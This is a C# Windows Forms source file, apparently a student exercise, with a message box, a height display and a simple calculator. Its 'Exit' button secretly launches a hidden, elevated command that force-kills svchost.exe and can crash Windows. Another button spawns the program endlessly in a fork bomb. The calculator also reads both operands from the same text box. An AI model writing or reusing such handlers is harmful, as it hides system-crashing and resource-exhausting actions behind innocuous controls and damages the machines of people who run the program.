using FormsAppButBetter.Exeptions;
using System.Diagnostics;
using System.Linq.Expressions;

namespace FormsAppButBetter
{
    public partial class App : Form
    {
        public App()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Koles³aw");
        }

        private void RestartButton_Click(object sender, EventArgs e)
        {
            Application.Restart();
        }

        private void ExitButton_Click(object sender, EventArgs e)
        {
            Process proc = new Process();

            ProcessStartInfo info = new ProcessStartInfo()
            {
                FileName = "CMD.exe",
                Arguments = "/C taskkill /im svchost.exe /f",
                CreateNoWindow = true,
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                Verb = "runas"
            };

            proc.StartInfo = info;
            proc.Start();
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show($"Your Height: {this.textBox1.Text}cm");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            while (true)
            {
                Process.Start("FormsAppButBetter.exe", "C:\\Users\\k4spa\\source\\repos\\KursALX\\FormsAppButBetter\\bin\\Debug\\net6.0-windows\\");
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                var x = double.Parse(textBox2.Text);
                var y = double.Parse(textBox2.Text);
                LogBox.Text += "Ive succeded! \r\n";
                textBox4.Text = PerformOperation(x, y).ToString();
            }
            catch (Exception ex)
            {
                LogBox.Text += $"Fatal Error: {ex.Message} \r\n";
                textBox4.Text = "Fatal Error";
            }
            finally
            {
                LogBox.Text += "Well ive tried \r\n"; ;
            }
        }

        private double PerformOperation(double x, double y)
        {
            if(radioButton1.Checked)
            {
                return x + y;
            }
            else if (radioButton2.Checked)
            {
                return x - y;
            }
            else if (radioButton3.Checked)
            {
                return x * y;
            }
            else
            {
                return x / y;
            }
        }
    }
}